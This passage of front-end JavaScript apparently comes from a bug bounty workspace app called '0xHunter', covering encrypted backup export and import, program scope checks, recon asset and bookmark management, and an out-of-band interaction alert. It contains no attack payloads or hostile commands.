    const ext = format === 'markdown' ? 'md' : 'txt';
    a.download = '0xHunter_Report_' + new Date().toISOString().split('T')[0] + '.' + ext;
    a.click();
  }
  toast('Report downloaded', 'success');
}

// ── AES-256 BACKUP ENCRYPTION ROUTINES (Web Crypto API) ───────
async function encryptDataAesGcm(text, password) {
  const enc = new TextEncoder();
  const salt = window.crypto.getRandomValues(new Uint8Array(16));
  const iv = window.crypto.getRandomValues(new Uint8Array(12));
  
  const passwordKey = await window.crypto.subtle.importKey(
    "raw",
    enc.encode(password),
    { name: "PBKDF2" },
    false,
    ["deriveKey"]
  );
  
  const aesKey = await window.crypto.subtle.deriveKey(
    {
      name: "PBKDF2",
      salt: salt,
      iterations: 100000,
      hash: "SHA-256"
    },
    passwordKey,
    { name: "AES-GCM", length: 256 },
    false,
    ["encrypt"]
  );
  
  const ciphertext = await window.crypto.subtle.encrypt(
    {
      name: "AES-GCM",
      iv: iv
    },
    aesKey,
    enc.encode(text)
  );
  
  const arrayBufferToBase64 = (buffer) => {
    let binary = '';
    const bytes = new Uint8Array(buffer);
    const len = bytes.byteLength;
    for (let i = 0; i < len; i++) {
      binary += String.fromCharCode(bytes[i]);
    }
    return window.btoa(binary);
  };
  
  return {
    encrypted: true,
    ciphertext: arrayBufferToBase64(ciphertext),
    salt: arrayBufferToBase64(salt),
    iv: arrayBufferToBase64(iv)
  };
}

async function decryptDataAesGcm(encryptedPayload, password) {
  const enc = new TextDecoder();
  const rawDec = new TextEncoder();
  
  const base64ToArrayBuffer = (base64) => {
    const binaryString = window.atob(base64);
    const len = binaryString.length;
    const bytes = new Uint8Array(len);
    for (let i = 0; i < len; i++) {
      bytes[i] = binaryString.charCodeAt(i);
    }
    return bytes.buffer;
  };
  
  const salt = base64ToArrayBuffer(encryptedPayload.salt);
  const iv = base64ToArrayBuffer(encryptedPayload.iv);
  const ciphertext = base64ToArrayBuffer(encryptedPayload.ciphertext);
  
  const passwordKey = await window.crypto.subtle.importKey(
    "raw",
    rawDec.encode(password),
    { name: "PBKDF2" },
    false,
    ["deriveKey"]
  );
  
  const aesKey = await window.crypto.subtle.deriveKey(
    {
      name: "PBKDF2",
      salt: salt,
      iterations: 100000,
      hash: "SHA-256"
    },
    passwordKey,
    { name: "AES-GCM", length: 256 },
    false,
    ["decrypt"]
  );
  
  const decryptedBuffer = await window.crypto.subtle.decrypt(
    {
      name: "AES-GCM",
      iv: iv
    },
    aesKey,
    ciphertext
  );
  
  return enc.decode(decryptedBuffer);
}

async function exportData() {
  const exportPayload = Object.assign({}, S, {
    bookmarks: S.bookmarks || [],
    customPayloads: S.customPayloads || [],
    customTools: S.customTools || [],
    customGhResources: S.customGhResources || [],
    favoriteGhResources: S.favoriteGhResources || []
  });
  
  const password = prompt("Enter a password to encrypt your backup file (leave blank to export unencrypted):");
  if (password === null) return;
  
  let fileContent;
  let filenameSuffix = '';
  if (password) {
    toast("Encrypting backup...", "info");
    try {
      const jsonStr = JSON.stringify(exportPayload);
      const encrypted = await encryptDataAesGcm(jsonStr, password);
      fileContent = JSON.stringify(encrypted);
      filenameSuffix = '_encrypted';
    } catch(e) {
      toast("Encryption failed: " + e.message, "error");
      return;
    }
  } else {
    fileContent = JSON.stringify(exportPayload);
  }
  
  const a = document.createElement('a');
  a.href = 'data:text/json;charset=utf-8,' + encodeURIComponent(fileContent);
  a.download = '0xHunter_Backup_' + new Date().toISOString().split('T')[0] + filenameSuffix + '.json';
  a.click();
  toast('Full workspace backup exported successfully', 'success');
}

function importData() { document.getElementById('import-file').click(); }

function handleImport(e) {
  const f = e.target.files[0];
  if (!f) return;
  const r = new FileReader();
  r.onload = async ev => {
    try {
      let rawData = JSON.parse(ev.target.result);
      
      if (rawData && rawData.encrypted && rawData.ciphertext) {
        const password = prompt("This backup file is encrypted. Enter the decryption password:");
        if (password === null) return;
        if (!password) {
          toast("Password required to decrypt backup", "error");
          return;
        }
        toast("Decrypting backup...", "info");
        try {
          const decryptedStr = await decryptDataAesGcm(rawData, password);
          rawData = JSON.parse(decryptedStr);
        } catch(err) {
          toast("Decryption failed: check if your password is correct", "error");
          return;
        }
      }
      
      showConfirm(
        'Import will replace ALL workspace data (targets, findings, notes, assets). This cannot be undone. Continue?',
        async () => {
          try {
            rawData.confirm_wipe = true;
            const res = await fetch('/api/import', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(rawData)
            });
            if (res.status === 401) { window.location.href = '/login'; return; }
            if (!res.ok) {
              const err = await res.json().catch(() => ({}));
              throw new Error(err.error || 'import failed');
            }
            if (rawData.customTools) S.customTools = rawData.customTools;
            if (rawData.customPayloads) S.customPayloads = rawData.customPayloads;
            if (rawData.bookmarks) S.bookmarks = rawData.bookmarks;
            if (rawData.customGhResources) S.customGhResources = rawData.customGhResources;
            if (rawData.favoriteGhResources) S.favoriteGhResources = rawData.favoriteGhResources;
            save();
            
            toast('Import complete! Reloading data...', 'success');
            loadData();
            setTimeout(() => { renderTools(); renderChecklist(); }, 500);
          } catch (err) { toast('Import failed: ' + err.message, 'error'); }
        }
      );
    } catch (err) { toast('Invalid backup file — could not parse JSON'); }
  };
  r.readAsText(f);
  e.target.value = '';
}

function renderScopeSummary() {
  const el = document.getElementById('scope-summary');
  if (!el) return;
  const active = S.targets.filter(t => t.status === 'active');
  if (!active.length) {
    el.innerHTML = '<div class="empty-state" style="padding:20px 0;"><div class="es-sub">Add targets with scope to see summary</div></div>';
    return;
  }
  el.innerHTML = active.map(t => `
    <div style="padding:10px 0;border-bottom:1px solid var(--border)">
      <div style="font-weight:600;margin-bottom:6px">${esc(t.name)}</div>
      <div style="font-size:11px;color:var(--green);font-family:var(--mono)">In: ${esc(t.scope || '—')}</div>
      ${t.outScope ? `<div style="font-size:11px;color:var(--red);font-family:var(--mono);margin-top:4px">Out: ${esc(t.outScope)}</div>` : ''}
    </div>`).join('');
}

function checkScope() {
  const input = document.getElementById('scope-url').value.trim();
  const resArea = document.getElementById('scope-result-area');
  if (!input) { resArea.innerHTML = ''; return; }
  const result = evaluateScope(input);
  if (result.inScope) {
    resArea.innerHTML = '<div class="scope-result in-scope">In Scope — ' + esc(result.target) + '</div>';
  } else if (result.outScope) {
    resArea.innerHTML = '<div class="scope-result out-scope">Out of Scope — ' + esc(result.target) + '</div>';
  } else {
    resArea.innerHTML = '<div class="scope-result warn">Not matched to any active program scope</div>';
  }
}

function bulkScopeCheck() {
  const urls = document.getElementById('scope-bulk').value.split('\n').map(u => u.trim()).filter(Boolean);
  document.getElementById('scope-bulk-results').innerHTML = urls.map(url => {
    const res = evaluateScope(url);
    const badge = res.inScope ? '<span class="chip chip-green">In Scope</span>' :
      res.outScope ? '<span class="chip chip-red">Out of Scope</span>' :
        '<span class="chip chip-yellow">Unknown</span>';
    return '<div style="display:flex;justify-content:space-between;padding:8px;border-bottom:1px solid var(--border);font-size:12px"><span>' + esc(url) + '</span>' + badge + '</div>';
  }).join('');
}

function evaluateScope(url) {
  try {
    const hostname = new URL(url.includes('://') ? url : 'http://' + url).hostname;
    for (const t of S.targets.filter(x => x.status === 'active')) {
      if (t.outScope) {
        for (const os of t.outScope.split(',').map(s => s.trim()).filter(Boolean)) {
          if (matchDomain(hostname, os)) return { inScope: false, outScope: true, target: t.name };
        }
      }
      if (t.scope) {
        for (const is of t.scope.split(',').map(s => s.trim()).filter(Boolean)) {
          if (matchDomain(hostname, is)) return { inScope: true, outScope: false, target: t.name };
        }
      }
    }
  } catch (e) { /* invalid url */ }
  return { inScope: false, outScope: false, target: null };
}

function matchDomain(host, pattern) {
  if (!pattern) return false;
  if (pattern.startsWith('*.')) {
    const base = pattern.slice(2);
    return host === base || host.endsWith('.' + base);
  }
  return host === pattern || host.endsWith('.' + pattern);
}

function selectReconTarget(id) {
  reconTargetId = id;
  const sel = document.getElementById('recon-target-select');
  if (sel) sel.value = id;
  renderReconAssets();
}

function renderReconPage() {
  const sel = document.getElementById('recon-target-select');
  if (!sel) return;
  sel.innerHTML = '<option value="">— Select target —</option>' +
    S.targets.map(t => `<option value="${t.id}">${esc(t.name)}</option>`).join('');
  if (reconTargetId) sel.value = reconTargetId;
  renderReconAssets();
}

window.reconSearch = '';
window.reconStatusFilter = 'all';
window.reconScopeFilter = 'all';

window.setReconStatusFilter = function(val, btn) {
  window.reconStatusFilter = val;
  document.querySelectorAll('#recon-filter-status-group .recon-pill').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  renderReconAssets();
};

window.setReconScopeFilter = function(val, btn) {
  window.reconScopeFilter = val;
  document.querySelectorAll('#recon-filter-scope-group .recon-pill').forEach(b => b.classList.remove('active', 'active-scope', 'active-outofscope'));
  if (val === 'in') btn.classList.add('active-scope');
  else if (val === 'out') btn.classList.add('active-outofscope');
  else btn.classList.add('active');
  renderReconAssets();
};

function renderReconAssets() {
  const list = document.getElementById('recon-asset-list');
  const countEl = document.getElementById('recon-assets-count');
  if (!list) return;
  
  const tid = document.getElementById('recon-target-select')?.value || reconTargetId;
  if (!tid) {
    list.innerHTML = '<div class="empty-state"><div class="es-sub">Select a target program</div></div>';
    if (countEl) countEl.textContent = 'Showing 0 assets';
    return;
  }
  
  reconTargetId = parseInt(tid, 10);
  const assets = S.assets.filter(a => a.targetId == tid);
  
  // Get search input
  const searchInput = document.getElementById('recon-asset-search');
  const q = searchInput ? searchInput.value.trim().toLowerCase() : '';
  
  // Filter assets
  let filtered = [...assets];
  if (q) {
    filtered = filtered.filter(a => a.value.toLowerCase().includes(q));
  }
  if (window.reconStatusFilter !== 'all') {
    filtered = filtered.filter(a => a.status === window.reconStatusFilter);
  }
  if (window.reconScopeFilter !== 'all') {
    filtered = filtered.filter(a => {
      const res = evaluateScope(a.value);
      return window.reconScopeFilter === 'in' ? res.inScope : res.outScope;
    });
  }
  
  if (countEl) {
    countEl.textContent = `Showing ${filtered.length} of ${assets.length} assets`;
  }
  
  if (!filtered.length) {
    list.innerHTML = '<div class="empty-state"><div class="es-sub">No assets match your search filters</div></div>';
    return;
  }
  
  let html = `
  <table class="recon-table">
    <thead>
      <tr>
        <th style="width:140px;">Status</th>
        <th>Asset / Value</th>
        <th style="width:110px;">Scope</th>
        <th style="width:80px; text-align:right;">Actions</th>
      </tr>
    </thead>
    <tbody>
  `;
  
  html += filtered.map(a => {
    const res = evaluateScope(a.value);
    let scopeBadge = '';
    if (res.inScope) scopeBadge = '<span class="status-badge status-open" style="font-size:10px;padding:2px 6px">In Scope</span>';
    else if (res.outScope) scopeBadge = '<span class="status-badge status-resolved" style="font-size:10px;padding:2px 6px">Out of Scope</span>';
    else scopeBadge = '<span class="status-badge status-closed" style="font-size:10px;padding:2px 6px">Unknown</span>';
    
    return `
    <tr>
      <td>
        <select class="form-control form-control-sm" style="width:120px;padding:2px 6px;font-size:11.5px;margin-bottom:0;background:var(--bg3);" onchange="updateAssetStatus(${a.id}, this.value)">
          <option value="new" ${a.status === 'new' ? 'selected' : ''}>New</option>
          <option value="tested" ${a.status === 'tested' ? 'selected' : ''}>Tested</option>
          <option value="interesting" ${a.status === 'interesting' ? 'selected' : ''}>Interesting</option>
        </select>
      </td>
      <td>
        <span style="font-family:var(--mono);word-break:break-all;color:#fff;font-size:12.5px;">${esc(a.value)}</span>
      </td>
      <td>
        ${scopeBadge}
      </td>
      <td style="text-align:right;">
        <div style="display:flex;gap:6px;justify-content:flex-end;">
          <button class="copy-btn btn-sm" onclick="navigator.clipboard.writeText('${esc(a.value).replace(/'/g, "\\'")}').then(()=>toast('Copied!'))" title="Copy to clipboard" style="padding:2px 6px;font-size:11px;margin-bottom:0;">📋 Copy</button>
          <button class="btn btn-sm btn-danger" onclick="removeAsset(${a.id})" style="padding:2px 6px;font-size:11px;margin-bottom:0;" title="Delete Asset">🗑️</button>
        </div>
      </td>
    </tr>
    `;
  }).join('');
  
  html += `
    </tbody>
  </table>
  `;
  
  list.innerHTML = html;
}

window.syncReconRunnerTarget = function() {
  if (S.targets && S.targets.length > 0) {
    const tid = document.getElementById('recon-target-select')?.value;
    const target = S.targets.find(x => x.id == tid) || S.targets[0];
    const host = target.host || target.name || '';
    const cleanHost = host.replace(/^https?:\/\//i, '').split('/')[0];
    const inp = document.getElementById('recon-runner-target');
    if (inp) {
      inp.value = cleanHost;
      toast(`Target synced to "${cleanHost}"`, 'success');
    }
  } else {
    toast('No targets found in workspace', 'error');
  }
};

window.bulkMarkAssetsTested = async function() {
  const tid = document.getElementById('recon-target-select')?.value;
  if (!tid) return toast('Select a target program first', 'error');
  
  const searchInput = document.getElementById('recon-asset-search');
  const q = searchInput ? searchInput.value.trim().toLowerCase() : '';
  
  let filtered = S.assets.filter(a => a.targetId == tid && a.status !== 'tested');
  if (q) {
    filtered = filtered.filter(a => a.value.toLowerCase().includes(q));
  }
  if (window.reconStatusFilter !== 'all') {
    filtered = filtered.filter(a => a.status === window.reconStatusFilter);
  }
  if (window.reconScopeFilter !== 'all') {
    filtered = filtered.filter(a => {
      const res = evaluateScope(a.value);
      return window.reconScopeFilter === 'in' ? res.inScope : res.outScope;
    });
  }
  
  if (!filtered.length) return toast('No filtered assets to update', 'info');
  if (!confirm(`Mark all ${filtered.length} matching assets as Tested?`)) return;
  
  for (const a of filtered) {
    a.status = 'tested';
    await apiPost('/api/assets', a);
  }
  save();
  renderReconAssets();
  toast(`Marked ${filtered.length} assets as Tested`, 'success');
};

window.bulkRemoveOutOfScope = async function() {
  const tid = document.getElementById('recon-target-select')?.value;
  if (!tid) return toast('Select a target program first', 'error');
  
  const assets = S.assets.filter(a => a.targetId == tid);
  const outOfScope = assets.filter(a => evaluateScope(a.value).outScope);
  
  if (!outOfScope.length) return toast('No out-of-scope assets found', 'info');
  if (!confirm(`Are you sure you want to delete all ${outOfScope.length} out-of-scope assets?`)) return;
  
  for (const a of outOfScope) {
    await apiDelete('/api/assets/' + a.id);
    S.assets = S.assets.filter(x => x.id !== a.id);
  }
  renderReconAssets();
  toast(`Removed ${outOfScope.length} out-of-scope assets`, 'success');
};

window.bulkDeleteAssets = async function() {
  const tid = document.getElementById('recon-target-select')?.value;
  if (!tid) return toast('Select a target program first', 'error');
  
  const searchInput = document.getElementById('recon-asset-search');
  const q = searchInput ? searchInput.value.trim().toLowerCase() : '';
  
  let filtered = S.assets.filter(a => a.targetId == tid);
  if (q) {
    filtered = filtered.filter(a => a.value.toLowerCase().includes(q));
  }
  if (window.reconStatusFilter !== 'all') {
    filtered = filtered.filter(a => a.status === window.reconStatusFilter);
  }
  if (window.reconScopeFilter !== 'all') {
    filtered = filtered.filter(a => {
      const res = evaluateScope(a.value);
      return window.reconScopeFilter === 'in' ? res.inScope : res.outScope;
    });
  }
  
  if (!filtered.length) return toast('No assets to delete', 'info');
  if (!confirm(`Are you sure you want to delete all ${filtered.length} matching assets?`)) return;
  
  for (const a of filtered) {
    await apiDelete('/api/assets/' + a.id);
    S.assets = S.assets.filter(x => x.id !== a.id);
  }
  renderReconAssets();
  toast(`Deleted ${filtered.length} assets`, 'success');
};

window.exportReconAssets = function() {
  const tid = document.getElementById('recon-target-select')?.value;
  if (!tid) return toast('Select a target program first', 'error');
  
  const searchInput = document.getElementById('recon-asset-search');
  const q = searchInput ? searchInput.value.trim().toLowerCase() : '';
  
  let filtered = S.assets.filter(a => a.targetId == tid);
  if (q) {
    filtered = filtered.filter(a => a.value.toLowerCase().includes(q));
  }
  if (window.reconStatusFilter !== 'all') {
    filtered = filtered.filter(a => a.status === window.reconStatusFilter);
  }
  if (window.reconScopeFilter !== 'all') {
    filtered = filtered.filter(a => {
      const res = evaluateScope(a.value);
      return window.reconScopeFilter === 'in' ? res.inScope : res.outScope;
    });
  }
  
  if (!filtered.length) return toast('No assets to export', 'info');
  
  const text = filtered.map(a => a.value).join('\n');
  const blob = new Blob([text], { type: 'text/plain' });
  const url = URL.createObjectURL(blob);
  const link = document.createElement('a');
  link.href = url;
  link.download = `recon_assets_target_${tid}.txt`;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  URL.revokeObjectURL(url);
  toast('Assets exported successfully', 'success');
};

async function bulkAddAssets() {
  const selEl = document.getElementById('recon-target-select');
  const tid = selEl?.value;
  const text = document.getElementById('recon-bulk').value;
  if (!tid) {
    if (selEl) {
      selEl.style.borderColor = 'var(--red)';
      selEl.style.boxShadow = '0 0 0 3px rgba(248,113,113,0.15)';
      setTimeout(() => { selEl.style.borderColor = ''; selEl.style.boxShadow = ''; }, 2500);
    }
    toast('⚠️ Select a target program first', 'error');
    return;
  }
  const lines = text.split('\n').map(l => l.trim()).filter(Boolean);
  if (!lines.length) { toast('Paste at least one URL or host'); return; }
  const res = await fetch('/api/assets/bulk', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ targetId: parseInt(tid, 10), lines, type: 'url' })
  });
  if (!res.ok) { toast('Failed to add assets', 'error'); return; }
  document.getElementById('recon-bulk').value = '';
  const data2 = await res.json();
  toast(`Added ${data2.count || 0} asset(s)`, 'success');
  loadData().then(() => renderReconAssets());
}

async function updateAssetStatus(id, status) {
  const a = S.assets.find(x => x.id === id);
  if (!a) return;
  a.status = status;
  await apiPost('/api/assets', a);
  save();
}

async function removeAsset(id) {
  S.assets = S.assets.filter(a => a.id !== id);
  await apiDelete('/api/assets/' + id);
  renderReconAssets();
  toast('Asset removed');
}


window.bmSearchQuery = window.bmSearchQuery || '';
window.bmActiveCat = window.bmActiveCat || 'all';

function renderBookmarks() {
  if (!S.bookmarks) S.bookmarks = [];
  const el = document.getElementById('bookmarks-list');
  if (!el) return;

  const builtIn = window.builtInBookmarks || [];
  
  // Format custom bookmarks to match built-in format
  const custom = S.bookmarks.map(b => ({
    id: b.id,
    name: b.label || b.url,
    url: b.url,
    cat: b.cat || b.tag || 'My Bookmarks',
    tag: b.tag,
    isCustom: true
  }));

  let list = [...custom, ...builtIn];

  // Category counts
  const catCounts = {};
  let catOrder = [];
  list.forEach(b => {
    const cat = b.cat || 'Misc';
    catCounts[cat] = (catCounts[cat] || 0) + 1;
    if (!catOrder.includes(cat)) catOrder.push(cat);
  });
  catOrder.sort();

  // Populate categories datalist dynamic options
  const dl = document.getElementById('bm-categories-list');
  if (dl) {
    dl.innerHTML = catOrder.map(cat => `<option value="${esc(cat)}">`).join('');
  }

  // Apply category filter
  let filtered = bmActiveCat === 'all' ? list : list.filter(b => (b.cat || 'Misc') === bmActiveCat);

  // Apply search
  const q = bmSearchQuery.toLowerCase();
  if (q) {
    filtered = filtered.filter(b => {
      const hay = [b.name, b.url, b.cat, b.tag].join(' ').toLowerCase();
      return hay.includes(q);
    });
  }

  // Update counts and UI
  const countEl = document.getElementById('bm-search-count');
  if (countEl) countEl.textContent = filtered.length + ' bookmarks';
  const clearBtn = document.getElementById('bm-search-clear');
  if (clearBtn) clearBtn.style.display = q ? 'block' : 'none';

  // Render Category Pills
  const pillsEl = document.getElementById('bm-cat-pills');
  if (pillsEl) {
    let pillsHtml = `<div class="tools-cat-pill ${bmActiveCat === 'all' ? 'active' : ''}" onclick="bmActiveCat='all'; renderBookmarks()">All <span class="pill-count">${list.length}</span></div>`;
    catOrder.forEach(cat => {
      if (catCounts[cat] > 0) {
        pillsHtml += `<div class="tools-cat-pill ${bmActiveCat === cat ? 'active' : ''}" onclick="bmActiveCat='${esc(cat)}'; renderBookmarks()">${esc(cat)} <span class="pill-count">${catCounts[cat]}</span></div>`;
      }
    });
    pillsEl.innerHTML = pillsHtml;
  }

  if (filtered.length === 0) {
    el.innerHTML = '<div class="empty-state"><div class="es-sub">No bookmarks found.</div></div>';
    return;
  }

  // Group by category
  const groups = {};
  filtered.forEach(b => {
    const c = b.cat || 'Misc';
    if (!groups[c]) groups[c] = [];
    groups[c].push(b);
  });

  const getDomain = (url) => {
    try {
      return new URL(url).hostname;
    } catch(e) {
      let domain = url.replace(/^(https?:\/\/)?(www\.)?/, '');
      return domain.split('/')[0].split('?')[0];
    }
  };

  // Render grouped HTML
  let html = '';
  catOrder.forEach(cat => {
    if (!groups[cat] || groups[cat].length === 0) return;
    
    html += `<div class="category-header">${esc(cat)}</div>`;
    html += `<div class="bookmarks-grid">`;
    
    groups[cat].forEach(b => {
      const domain = getDomain(b.url);
      html += `
        <div class="bookmark-card">
          <a href="${esc(b.url)}" target="_blank" rel="noopener" class="bookmark-card-top" style="text-decoration:none; cursor:pointer;">
            <div class="bookmark-title">
              <img src="https://www.google.com/s2/favicons?sz=32&domain=${esc(domain)}" 
                   onerror="this.style.display='none'; this.nextElementSibling.style.display='inline-block';" 
                   class="bm-favicon" alt="">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="display:none; flex-shrink:0; transition: transform 0.2s ease;" class="bm-icon fallback-icon"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
              <span>${esc(b.name)}</span>
            </div>
            <div class="bookmark-url" title="${esc(b.url)}">${esc(b.url)}</div>
          </a>
          <div class="bookmark-actions">
            <span style="width:1px;"></span>
            <div style="display:flex; gap:8px;">
              <a href="${esc(b.url)}" target="_blank" rel="noopener" class="bookmark-btn" style="padding: 6px 14px;">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17l9.2-9.2M17 17V7H7"/></svg>
                Visit
              </a>
              ${b.isCustom ? `
              <button class="bookmark-btn bookmark-btn-edit" onclick="editBookmark(${b.id})" title="Edit Bookmark">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 20h9"></path><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"></path></svg>
              </button>
              <button class="bookmark-btn bookmark-btn-del" onclick="removeBookmark(${b.id})" title="Delete Bookmark">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6h18"></path><path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6"></path><path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"></path></svg>
              </button>` : ''}
            </div>
          </div>
        </div>`;
    });
    html += `</div>`;
  });

  el.innerHTML = html;
}

function openAddBookmarkModal() {
  document.getElementById('edit-bm-id').value = '';
  document.getElementById('edit-bm-url').value = '';
  document.getElementById('edit-bm-label').value = '';
  document.getElementById('edit-bm-cat').value = '';
  
  const titleEl = document.getElementById('modal-edit-bookmark-title');
  if (titleEl) titleEl.textContent = '➕ Add Bookmark';
  
  openModal('modal-edit-bookmark');
}

function addBookmark() {
  openAddBookmarkModal();
}

function removeBookmark(id) {
  S.bookmarks = (S.bookmarks || []).filter(b => b.id !== id);
  save();
  renderBookmarks();
  toast('Bookmark deleted', 'info');
}

function editBookmark(id) {
  if (!S.bookmarks) return;
  const b = S.bookmarks.find(item => item.id === id);
  if (!b) return;

  document.getElementById('edit-bm-id').value = b.id;
  document.getElementById('edit-bm-url').value = b.url;
  document.getElementById('edit-bm-label').value = b.label || b.url;
  document.getElementById('edit-bm-cat').value = b.cat || b.tag || 'My Bookmarks';

  const titleEl = document.getElementById('modal-edit-bookmark-title');
  if (titleEl) titleEl.textContent = '✏️ Edit Bookmark';

  openModal('modal-edit-bookmark');
}

function saveEditBookmark() {
  const idStr = document.getElementById('edit-bm-id').value;
  const url = document.getElementById('edit-bm-url').value.trim();
  const label = document.getElementById('edit-bm-label').value.trim();
  const cat = document.getElementById('edit-bm-cat').value.trim() || 'My Bookmarks';

  if (!url) { toast('URL is required', 'error'); return; }

  let cleanUrl = url;
  if (!/^https?:\/\//i.test(cleanUrl) && !/^\/\//.test(cleanUrl)) {
    cleanUrl = 'https://' + cleanUrl;
  }

  if (!S.bookmarks) S.bookmarks = [];

  if (idStr === '') {
    // Add operation
    S.bookmarks.unshift({
      id: Date.now(),
      url: cleanUrl,
      label: label || cleanUrl,
      cat: cat,
      tag: cat
    });
    toast('Bookmark saved', 'success');
  } else {
    // Edit operation
    const id = parseInt(idStr);
    const idx = S.bookmarks.findIndex(b => b.id === id);
    if (idx !== -1) {
      S.bookmarks[idx].url = cleanUrl;
      S.bookmarks[idx].label = label || cleanUrl;
      S.bookmarks[idx].cat = cat;
      S.bookmarks[idx].tag = cat;
      toast('Bookmark updated', 'success');
    } else {
      toast('Error updating bookmark', 'error');
      return;
    }
  }

  save();
  renderBookmarks();
  closeModal('modal-edit-bookmark');
}

document.querySelectorAll('.modal-overlay').forEach(el => {
  el.addEventListener('click', e => {
    if (e.target === el) {
      closeModal(el.id);
      // Reset editing state when the modal is closed via backdrop click
      if (el.id === 'modal-finding') {
        editingFindingId = null;
        _findingUnsaved = false;
        _clearFindingUnsavedDot();
      }
      if (el.id === 'modal-target') {
        editingTargetId = null;
      }
    }
  });
});


// Cmd palette keyboard navigation — update focused class on arrow move
document.getElementById('cmd-input')?.addEventListener('input', e => renderCmdResults(e.target.value));
document.getElementById('cmd-input')?.addEventListener('keydown', e => {
  const res = document.querySelectorAll('.cmd-result-item');
  if (e.key === 'ArrowDown') {
    cmdIdx = Math.min(cmdIdx + 1, res.length - 1);
    e.preventDefault();
    res.forEach((el, i) => el.classList.toggle('focused', i === cmdIdx));
  }
  if (e.key === 'ArrowUp') {
    cmdIdx = Math.max(cmdIdx - 1, 0);
    e.preventDefault();
    res.forEach((el, i) => el.classList.toggle('focused', i === cmdIdx));
  }
  if (e.key === 'Enter') { res[cmdIdx]?.click(); e.preventDefault(); }
  if (e.key === 'Escape') closeCmdPalette();
});

setInterval(() => {
  const el = document.getElementById('session-timer');
  if (el) el.textContent = formatTimer(sessionStart);
}, 1000);

document.addEventListener('keydown', e => {
  if ((e.ctrlKey || e.metaKey) && e.key === 'k') { e.preventDefault(); openCmdPalette(); }
  // Ctrl+S to save finding when modal is open
  if ((e.ctrlKey || e.metaKey) && e.key === 's') {
    const modalFinding = document.getElementById('modal-finding');
    if (modalFinding && modalFinding.classList.contains('open')) {
      e.preventDefault();
      saveFinding();
      return;
    }
  }
  if (e.key === 'Escape') {
    closeCmdPalette();
    const confirmOverlay = document.getElementById('custom-confirm-overlay');
    if (confirmOverlay) confirmOverlay.style.display = 'none';
  }
});

// ── OOB NOTIFICATIONS & SYNC DAEMON ───────────────────────────
function triggerOobAlert() {
  try {
    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    const playBeep = (delay, freq, duration) => {
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      osc.type = 'sine';
      osc.frequency.setValueAtTime(freq, audioCtx.currentTime + delay);
      osc.frequency.exponentialRampToValueAtTime(freq * 1.5, audioCtx.currentTime + delay + duration);
      gain.gain.setValueAtTime(0.12, audioCtx.currentTime + delay);
      gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + delay + duration);
      osc.connect(gain);
      gain.connect(audioCtx.destination);
      osc.start(audioCtx.currentTime + delay);
      osc.stop(audioCtx.currentTime + delay + duration);
    };
    playBeep(0, 880, 0.1);
    playBeep(0.1, 1320, 0.15);
  } catch(e) {}

  const oobBadge = document.querySelector('.tool-tile[data-hunt="oob"]');
  if (oobBadge) {
    oobBadge.classList.add('pulse-hotpink');
    setTimeout(() => oobBadge.classList.remove('pulse-hotpink'), 8000);
  }
  toast('🚨 OOB CATCHER: Received external payload interaction!', 'error');
}

let syncRunning = false;
setInterval(async () => {
  if (syncRunning) return;
  syncRunning = true;
  try {
    const res = await fetch('/api/data');
    if (res.status === 401) { window.location.href = '/login'; return; }
    if (!res.ok) throw new Error('load failed');
    const data = await res.json();
    
    const oldHitsCount = S.oob_hits ? S.oob_hits.length : 0;
    const newHitsCount = data.oob_hits ? data.oob_hits.length : 0;
    
    S.targets = data.targets || [];
    S.findings = data.findings || [];
    S.notes = data.notes || [];
    S.assets = data.assets || [];
    S.checklist = data.checklist || {};
    S.config = data.config || {};
    S.activity = data.activity || [];
    S.oob_payloads = data.oob_payloads || [];
    S.oob_hits = data.oob_hits || [];
    
    updateBadges();
    
    if (newHitsCount > oldHitsCount) {
      triggerOobAlert();
      if (typeof renderOobPage === 'function') renderOobPage();
    }
  } catch(e) {}
  syncRunning = false;
}, 10000);

// ── PLAYBOOK VARIABLES & CLIPBOARD INTERCEPTOR ─────────────────
function updateGlobalVariables() {
  const targetVal = document.getElementById('global-target')?.value.trim();
  const paramVal = document.getElementById('global-param')?.value.trim();
  const badge = document.getElementById('vars-active-badge');
  if (badge) {
    if (targetVal || paramVal) {
      badge.style.display = 'inline';
    } else {
      badge.style.display = 'none';
    }
  }
  try {
    localStorage.setItem('0xhunter_playbook_vars', JSON.stringify({
      target: targetVal,
      param: paramVal
    }));
  } catch(e) {}
}

function loadGlobalVariables() {
  try {
    const saved = localStorage.getItem('0xhunter_playbook_vars');
    if (saved) {
      const parsed = JSON.parse(saved);
      const targetInput = document.getElementById('global-target');
      const paramInput = document.getElementById('global-param');
      if (targetInput && parsed.target) targetInput.value = parsed.target;
      if (paramInput && parsed.param) paramInput.value = parsed.param;
      updateGlobalVariables();
    }
  } catch(e) {}
}

// Global Clipboard Overrider for variable mapping replacements
(function() {
  if (!navigator.clipboard || !navigator.clipboard.writeText) return;
  const originalWriteText = navigator.clipboard.writeText;
  navigator.clipboard.writeText = function(text) {
    let processedText = text;
    const targetVal = document.getElementById('global-target')?.value.trim();
    const paramVal = document.getElementById('global-param')?.value.trim();
    
    if (targetVal) {
